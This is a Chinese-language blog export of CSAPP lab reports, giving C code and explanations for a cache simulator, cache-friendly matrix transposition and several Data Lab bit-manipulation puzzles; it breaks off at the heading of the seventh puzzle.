<h3 id="任务a"><a class="markdownIt-Anchor" href="#任务a"></a> 任务A</h3>
<p><strong>实现代码：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADDR_SIZE 64;</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span>* filePath;</span><br><span class="line">    <span class="keyword">int</span> setNum;</span><br><span class="line">    <span class="keyword">int</span> lineNum;</span><br><span class="line">    <span class="keyword">int</span> blockNum;</span><br><span class="line">    <span class="keyword">bool</span> verbose;</span><br><span class="line">&#125;GlobalArgs;</span><br><span class="line">GlobalArgs globalArgs;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> tag;</span><br><span class="line">    <span class="keyword">int</span> timestamp;</span><br><span class="line">&#125;CacheLine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span>* optString=<span class="string">&quot;hvs:E:b:t:&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintHelp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;Usage: ./csim [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;Options:&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;  -h         Print this help message&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;  -v         Optional verbose flag&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;  -s &lt;num&gt;   Number of set index bits.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;  -E &lt;num&gt;   Number of lines per set.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;  -b &lt;num&gt;   Number of block offset bits&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;  -t &lt;file&gt;  Trace file.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;Examples:&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;  linux&gt;  ./csim-ref -s 4 -E 1 -b 4 -t traces/yi.trace&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,<span class="string">&quot;  linux&gt;  ./csim-ref -v -s 8 -E 2 -b 4 -t traces/yi.trace&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetArgus</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> opt=getopt(argc,argv,optString);</span><br><span class="line">    <span class="keyword">while</span> (opt!=<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">switch</span> (opt)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;h&#x27;</span>:</span><br><span class="line">                PrintHelp();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">                globalArgs.verbose=<span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">                globalArgs.setNum=atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">                globalArgs.lineNum=atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">                globalArgs.blockNum=atoi(optarg);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">                globalArgs.filePath=optarg;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;wrong argument\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        opt=getopt(argc,argv,optString);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TryToHitCache</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> address,<span class="keyword">int</span>* hit,<span class="keyword">int</span>* miss,<span class="keyword">int</span>* eviction,CacheLine* cache)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> timestamp=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> tagLen=<span class="number">64</span>-(globalArgs.setNum+globalArgs.blockNum);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">set</span>=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)((address&lt;&lt;tagLen)&gt;&gt;(tagLen+globalArgs.blockNum));</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> tag=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(address&gt;&gt;(<span class="number">64</span>-tagLen));</span><br><span class="line">    <span class="keyword">int</span> min=globalArgs.lineNum*<span class="built_in">set</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;globalArgs.lineNum;i++)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> idx=<span class="built_in">set</span>*globalArgs.lineNum+i;</span><br><span class="line">        <span class="keyword">if</span>(cache[idx].tag==tag&amp;&amp;cache[idx].timestamp!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cache[idx].timestamp=++timestamp;</span><br><span class="line">            (*hit)++;</span><br><span class="line">            <span class="keyword">if</span>(globalArgs.verbose)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;hit &quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(cache[idx].timestamp==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cache[idx].timestamp=++timestamp;</span><br><span class="line">            (*miss)++;</span><br><span class="line">            cache[idx].tag=tag;</span><br><span class="line">            <span class="keyword">if</span>(globalArgs.verbose)</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;miss &quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(cache[idx].timestamp&lt;cache[min].timestamp)</span><br><span class="line">            min=idx;</span><br><span class="line">    &#125;</span><br><span class="line">    cache[min].timestamp=++timestamp;</span><br><span class="line">    cache[min].tag=tag;</span><br><span class="line">    (*miss)++;</span><br><span class="line">    (*eviction)++;</span><br><span class="line">    <span class="keyword">if</span>(globalArgs.verbose)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;miss eviction &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    SetArgus(argc,argv);</span><br><span class="line">    <span class="keyword">if</span>(globalArgs.filePath==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    FILE* fp=fopen(globalArgs.filePath,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(fp==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;File not found %s\n&quot;</span>,globalArgs.filePath);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> hit=<span class="number">0</span>,miss=<span class="number">0</span>,eviction=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> S=(<span class="number">1</span>&lt;&lt;globalArgs.setNum);</span><br><span class="line">    <span class="keyword">int</span> E=globalArgs.lineNum;</span><br><span class="line"></span><br><span class="line">     CacheLine* cache=<span class="built_in">calloc</span>(S*E, <span class="keyword">sizeof</span>(CacheLine));</span><br><span class="line"></span><br><span class="line">     <span class="keyword">char</span> opt;</span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">long</span> address;</span><br><span class="line">     <span class="keyword">int</span> block;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     <span class="keyword">while</span>(<span class="built_in">fscanf</span>(fp,<span class="string">&quot; %c %lx,%d&quot;</span>, &amp;opt,&amp;address,&amp;block)&gt;<span class="number">0</span>)</span><br><span class="line">     &#123;</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="string">&#x27;I&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span>(globalArgs.verbose)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c %lx,%d &quot;</span>,opt,address,block);</span><br><span class="line">        &#125;</span><br><span class="line">        TryToHitCache(address,&amp;hit,&amp;miss,&amp;eviction,cache);</span><br><span class="line">        <span class="keyword">if</span>(opt==<span class="string">&#x27;M&#x27;</span>)</span><br><span class="line">            TryToHitCache(address,&amp;hit,&amp;miss,&amp;eviction,cache);</span><br><span class="line">        <span class="keyword">if</span>(globalArgs.verbose)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     fclose(fp);</span><br><span class="line">     <span class="built_in">free</span>(cache);</span><br><span class="line"></span><br><span class="line">     printSummary(hit,miss,eviction);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>任务A就是打开文件读入数据、处理数据、输出数据的过程，核心逻辑就是在于怎么模拟一个高速缓存来处理数据。我们将这部分逻辑封装在了<code>void TryToHitCache(unsigned long address,int* hit,int* miss,int* eviction,CacheLine* cache)</code>这个函数中。</p>
<p>首先我们定义一个静态变量<code>static int timestamp</code>，这个变量用来记录CPU向高速缓存器访问的时间戳（用来记录访问次数）。在该函数里我们需要接受几个参数，分别为请求的地址，hit次数，miss次数，eviction次数以及模拟的高速缓存器。然后我们将address的各部分结构进行解析，分别得到了set、tag等参数。</p>
<p>然后我们遍历模拟高速缓存器的组，比较address解析的set数是否与模拟缓存器的set数相同和是否可能为冷未命中的情况下。</p>
<p>如果能找到相同的tag且不是冷未命中的话，就将hit++，且更改<code>timestamp</code>的值。如果是冷未命中的话，就将miss++，并且更新<code>timestamp</code>的值并且设置该块的值。</p>
<p>如果则两种情况都不是的话，则需要更换块的内容。那么我们需要更新哪个块呢？根据局部性原则，我们应当更新距离我们这次访问时间戳距离最远的块，因此我们遍历一遍该组并找出该块并进行更换。然后进行更新数据。</p>
<h3 id="任务b"><a class="markdownIt-Anchor" href="#任务b"></a> 任务B:</h3>
<p><strong>实现代码：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose_submit</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a1,a2,a3,a4,a5,a6,a7,a8;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,h;</span><br><span class="line">    <span class="keyword">if</span>(N==<span class="number">32</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">4</span>;j++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(k=i*<span class="number">8</span>;k&lt;(i+<span class="number">1</span>)*<span class="number">8</span>;k++)&#123;</span><br><span class="line">                    h=j*<span class="number">8</span>;</span><br><span class="line">                    a1=A[k][h];a2=A[k][h+<span class="number">1</span>];a3=A[k][h+<span class="number">2</span>];a4=A[k][h+<span class="number">3</span>];</span><br><span class="line">                    a5=A[k][h+<span class="number">4</span>];a6=A[k][h+<span class="number">5</span>];a7=A[k][h+<span class="number">6</span>];a8=A[k][h+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                    B[h][k]=a1;B[h+<span class="number">1</span>][k]=a2;B[h+<span class="number">2</span>][k]=a3;B[h+<span class="number">3</span>][k]=a4;</span><br><span class="line">                    B[h+<span class="number">4</span>][k]=a5;B[h+<span class="number">5</span>][k]=a6;B[h+<span class="number">6</span>][k]=a7;B[h+<span class="number">7</span>][k]=a8;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(N==<span class="number">64</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i+=<span class="number">8</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">64</span>;j+=<span class="number">8</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(k=j;k&lt;j+<span class="number">4</span>;++k)&#123;</span><br><span class="line">                    a1=A[k][i];a2=A[k][i+<span class="number">1</span>];a3=A[k][i+<span class="number">2</span>];a4=A[k][i+<span class="number">3</span>];</span><br><span class="line">                    a5=A[k][i+<span class="number">4</span>];a6=A[k][i+<span class="number">5</span>];a7=A[k][i+<span class="number">6</span>];a8=A[k][i+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line">                    B[i][k]=a1;B[i][k+<span class="number">4</span>]=a5;B[i+<span class="number">1</span>][k]=a2;B[i+<span class="number">1</span>][k+<span class="number">4</span>]=a6;</span><br><span class="line">                    B[i+<span class="number">2</span>][k]=a3;B[i+<span class="number">2</span>][k+<span class="number">4</span>]=a7;B[i+<span class="number">3</span>][k]=a4;B[i+<span class="number">3</span>][k+<span class="number">4</span>]=a8;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span>(k=i;k&lt;i+<span class="number">4</span>;++k)&#123;</span><br><span class="line">                    a1=B[k][j+<span class="number">4</span>];a2=B[k][j+<span class="number">5</span>];a3=B[k][j+<span class="number">6</span>];a4=B[k][j+<span class="number">7</span>];</span><br><span class="line">                    a5=A[j+<span class="number">4</span>][k];a6=A[j+<span class="number">5</span>][k];a7=A[j+<span class="number">6</span>][k];a8=A[j+<span class="number">7</span>][k];</span><br><span class="line"></span><br><span class="line">                    B[k][j+<span class="number">4</span>]=a5;B[k][j+<span class="number">5</span>]=a6;B[k][j+<span class="number">6</span>]=a7;B[k][j+<span class="number">7</span>]=a8;</span><br><span class="line">                    B[k+<span class="number">4</span>][j]=a1;B[k+<span class="number">4</span>][j+<span class="number">1</span>]=a2;B[k+<span class="number">4</span>][j+<span class="number">2</span>]=a3;B[k+<span class="number">4</span>][j+<span class="number">3</span>]=a4;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span>(k=i+<span class="number">4</span>;k&lt;i+<span class="number">8</span>;++k)&#123;</span><br><span class="line">                    a1=A[j+<span class="number">4</span>][k];a2=A[j+<span class="number">5</span>][k];a3=A[j+<span class="number">6</span>][k];a4=A[j+<span class="number">7</span>][k];</span><br><span class="line"></span><br><span class="line">                    B[k][j+<span class="number">4</span>]=a1;B[k][j+<span class="number">5</span>]=a2;B[k][j+<span class="number">6</span>]=a3;B[k][j+<span class="number">7</span>]=a4;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;N;i+=<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;M;j+=<span class="number">16</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(k=i;k&lt;i+<span class="number">16</span>&amp;&amp;k&lt;N;k++)&#123;</span><br><span class="line">                    <span class="keyword">for</span>(h=j;h&lt;j+<span class="number">16</span>&amp;&amp;h&lt;M;h++)&#123;</span><br><span class="line">                        B[h][k]=A[k][h];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>本题很明显要使用分块进行优化，但分块后如下后距离答案要求的数量还有不少距离。</p>
<p>我这里参考了网上大神们的做法。</p>
<p><strong>32×32：</strong></p>
<p>第一题要求miss次数在300以下，首先观察，Cache的一个块只有32B，也就是只能容纳8个int。这个Cache可以容纳这个matrix的前8行。分块的话，肯定是取8×8的比较合适。先读取A的一行，然后放入B的一列。12个int变量，4个用来循环，其余8个用来存A中块的一行。</p>
<p>对于在对角线上的块，A中每读一行，会有一次miss，也就是miss次数是读取操作的1/8，对于B数组的话，第一次读取这行会产生一次miss，之后对于第i行，只有A中读到第i行的时候，会被移除出Cache，然后存的时候会产生一次miss。可以粗略计算为miss次数是读取次数的1/4。</p>
<p>对于不在对角线上的块，做转置的时候，A还是1/8的miss率，B的每行在Cache中和A的行不冲突 ，所以也是1/8的miss率，我们计算下最后大概多少次miss呢？</p>
<p>大概是 <img src="https://www.zhihu.com/equation?tex=4%5Ctimes+64%5Ctimes%28%5Cfrac%7B1%7D%7B8%7D%2B%5Cfrac%7B1%7D%7B4%7D%29%2B12%5Ctimes+64%5Ctimes2%5Ctimes%5Cfrac%7B1%7D%7B8%7D%3D288" alt="[公式]"></p>
<p>最后跑出来的答案是287，非常接近。</p>
<p><strong>64×64：</strong></p>
<p>首先考虑Cache中只能放4行A中的行，如果再用8×8的块，前面4行可以填入，后面4行会在Cache中发生冲突，导致miss次数增加。</p>
<p>如果只用4×4的块呢？那么每次Cache中放入8个int，我们却只用4个，浪费严重，我用这个方法最少也只能做到1677次miss。</p>
<p>有一种很巧妙的方法，就是还用8×8的块来做，题目说A数组不能变换，但是说B数组可以任意操作啊。我们必须要一步到位嘛？可否考虑先把数字移动到B中，然后在B中自己做变化。</p>
<p>考虑用同样的miss次数，把更多的数据移动到B中，但是不一定是正确的位置，然后再用同样的miss次数，把A中部分数据移动到B中时，完成把B中前面位置错误数据的纠正。</p>
<p>1.先考虑把A的上半部分存入到B，但是为了考虑Cache不冲突，所以把右上角的4×4的区域也存在B的右上角。对于在对角线上的块，A的miss率是1/8，B的左上角部分miss率是1/2。对于不在对角线上的块，A的miss率还是1/8，B左上角部分的miss率为1/4.</p>
<p>\2. 接下来这步是减少miss率的关键，把A左下角的一列4个数据读出，B右上角的一行4个数据读出，都用int变量暂存，然后把前四个填入B右上角行中，后四个填入B的左下角行中。</p>
<p>因为从B右上角读取的时候，把块放入了Cache，然后从A往B中填的时候，就不会出现miss操作。</p>
<p>来计算一下miss率，对于在对角线上的块，从A左下角读取miss率为1，B的右上角的操作miss率为1/4，B的左下角miss率为1/4。对于不在对角线的快，A的miss率为1/4，B右上角miss率为0，左下角miss率为1/4。</p>
<p>\3. 最后一步就是把A的右下角填入B的右下角，对于在对角线上的块，A的miss率为1/4，B的miss率为1/2.不在对角线上的块，A，B的miss率都为0.</p>
<p>最后我们来计算下miss的次数吧，计算出来近似是1280次，实际我们代码跑出来是1219次 。</p>
<p><strong>61×67：</strong></p>
<p>不规则的matrix，本质也是用分块来优化Cache的读写，但是不能找到比较显然的规律看出来间隔多少可以填满一个Cache，但是由于要求比较松，我们可以尝试一些分块的大小，直接进行转置操作。尝试到16左右 ，可以小于2000次miss。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Data Lab实验报告</title>
    <url>/2020/03/10/Data-Lab/</url>
    <content><![CDATA[<p><img src="/2020/03/10/Data-Lab/csapp.jpg" alt></p>
<a id="more"></a>
<h1 id="csapp-data-lab实验报告"><a class="markdownIt-Anchor" href="#csapp-data-lab实验报告"></a> CSAPP Data Lab实验报告</h1>
<h5 id="1isasciidightint-x"><a class="markdownIt-Anchor" href="#1isasciidightint-x"></a> 1.<code>isAsciiDight(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int isAsciiDigit(int x) &#123;</span><br><span class="line">    return(!((x+~48+1)&gt;&gt;31))&amp;!!((x+~58+1)&gt;&gt;31);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思想：</strong></p>
<p>题目要求当参数x大于等于48小于等于57的时候返回1，否则返回0。</p>
<p>于是我们将x减去48并将其右移31位保留其符号位，此时若x减去48大于等于0则符号位为0因此要将其进行取反；同样，将x减去58并将其右移31位，此时真好同上面那种情况相反，因此要对符号位取两次反，最后再取与运算获得结果。</p>
<h5 id="2-int-anyevenbitint-x"><a class="markdownIt-Anchor" href="#2-int-anyevenbitint-x"></a> 2. <code>int anyEvenBit(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int anyEvenBit(int x) &#123;</span><br><span class="line">    int t&#x3D;0x55 | (0x55&lt;&lt;8);</span><br><span class="line">    int mask&#x3D;t | (t&lt;&lt;16);</span><br><span class="line">    return !!(x&amp;mask);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思想：</strong></p>
<p>题目要求当参数x有任何偶数位设置为1时返回1，否则返回0。</p>
<p>因此我们构造一个掩码，令该掩码的偶数位全为1，奇数位全为0，再令输入的参数x和该掩码进行与运算，若x中有偶数位被设置为1的话则与之后必不为0，因此两次取反返回。</p>
<h5 id="3-int-copylsbint-x"><a class="markdownIt-Anchor" href="#3-int-copylsbint-x"></a> 3. <code>int copyLSB(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int copyLSB(int x) &#123;</span><br><span class="line">    return ((x&lt;&lt;31)&gt;&gt;31);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思想：</strong></p>
<p>本题要求设置所有位为参数x的最低位，所以先左移31位再右移31位进行符号位扩展。</p>
<h5 id="4-int-leastbitposint-x"><a class="markdownIt-Anchor" href="#4-int-leastbitposint-x"></a> 4. <code>int leastBitPos(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int leastBitPos(int x) &#123;</span><br><span class="line">    return x&amp;(~x+1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思想：</strong></p>
<p>本题要求返回参数x最低设置为1的数。</p>
<p>我们先将x按位取反，取反后的数与原数据正好每一位都相反，我们再将该数加1，则此数会向前进一位，此时当且仅当原数的最低取取1位和取反后数据该位都为1，因此进行与运算后得到结果。</p>
<h5 id="int-divpwr2int-x-int-n"><a class="markdownIt-Anchor" href="#int-divpwr2int-x-int-n"></a> <code>int divpwr2(int x, int n)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int divpwr2(int x, int n) &#123;</span><br><span class="line">    int sign &#x3D;(x&gt;&gt;31)&amp;1;</span><br><span class="line">    int bias &#x3D; (sign&lt;&lt;n)+~sign +1;</span><br><span class="line">    return (x+bias)&gt;&gt;n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>实验要求返回所给参数x/2^n的结果。</p>
<p>首先判断所给参数x的标志位，将x右移31位再和1进行与运算，若是正数则为0，负数则为1。</p>
<p>然后就是设置正数和负数的取整问题。当x为正数的时候，右移后向下取整，和题目要求相同，但是当x为负数时，也是向下取整，但此时题目要求要向上取整，因此要给负数加上一个偏置值再进行右移操作。因此负数要加上2^n-1来保证取整。</p>
<h5 id="6int-bitcountint-x"><a class="markdownIt-Anchor" href="#6int-bitcountint-x"></a> 6.<code>int bitCount(int x)</code></h5>
<p><strong>实现代码：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int bitCount(int x) &#123;</span><br><span class="line">    int t &#x3D; 0x55 + (0x55&lt;&lt;8);</span><br><span class="line">    int mask &#x3D; t + (t&lt;&lt;16);</span><br><span class="line">    x &#x3D; (x&amp;mask) + ((x&gt;&gt;1)&amp;mask);</span><br><span class="line"></span><br><span class="line">    t &#x3D; 0x33 + (0x33&lt;&lt;8);</span><br><span class="line">    mask &#x3D; t + (t&lt;&lt;16);</span><br><span class="line">    x &#x3D; (x&amp;mask) + ((x&gt;&gt;2)&amp;mask);</span><br><span class="line"></span><br><span class="line">    t &#x3D; 0xf + (0xf&lt;&lt;8);</span><br><span class="line">    mask &#x3D; t + (t&lt;&lt;16);</span><br><span class="line">    x &#x3D; (x&amp;mask) + ((x&gt;&gt;4)&amp;mask);</span><br><span class="line"></span><br><span class="line">    mask &#x3D; 0xff + (0xff&lt;&lt;16);</span><br><span class="line">    x &#x3D; (x&amp;mask) + ((x&gt;&gt;8)&amp;mask);</span><br><span class="line"></span><br><span class="line">    mask &#x3D; 0xff + (0xff&lt;&lt;8);</span><br><span class="line">    x &#x3D; (x&amp;mask) + ((x&gt;&gt;16)&amp;mask);</span><br><span class="line"></span><br><span class="line">    return x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>实现思路：</strong></p>
<p>问题要求返回参数x的位为1的个数。</p>
<p>所以我们需要一个个检查参数的每一位是否为1，并且将之累加起来。</p>
<p>从两位比特位入手，计算两位比特数中1的个数，就是高位与低位之和。</p>
<p>00: 0+0=(00)<sub>2</sub></p>
<p>01: 0+1=(01)<sub>2</sub></p>
<p>10: 1+0=(01)<sub>2</sub></p>
<p>11: 1+1=(10)<sub>2</sub></p>
<p>令一个二进制数B为b<sub>32</sub>b<sub>31</sub>…b<sub>1</sub></p>
<p>则L(l,r)表示一个二进制数在l和r区间之间的1的个数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">L(l,r)&#x3D; L(l,x)+ L(x+1,r) (l&lt;&#x3D;x&lt;r)</span><br><span class="line">L(l,r)&#x3D; bl (l&#x3D;r)</span><br></pre></td></tr></table></figure>
<p>对于一个32位的整数来说，可以用动态规划的思想自底向上计算。先计算L(1,1)+L(2,2)。</p>
<p>先构造一个只有低位L(1,1)的数<code>a=x&amp;x=0x01</code>和高位L(2,2)的数<code>b=(x&gt;&gt;1)&amp;0x01</code>,但我们发现可以同时计算L(3,3)和L(4,4)等数。只需将构造改为：</p>
<p><code>a=x&amp;0x55555555</code>,<code>b=(x&gt;&gt;1)&amp;0x55555555</code>, <code>x=a+b</code></p>
<p>计算L(1,2)和L(3,4)以此类推：</p>
<p><code>a=x&amp;0x33333333</code>, <code>b=(x&gt;&gt;1)&amp;0x33333333</code>, `x=a+b</p>
<h5 id="7-int-conditionalint-x-int-y-int-z"><a class="markdownIt-Anchor" href="#7-int-conditionalint-x-int-y-int-z"></a> 7. <code>int conditional(int x, int y, int z)</code></h5>
<p><strong>实现代码：</strong></p>
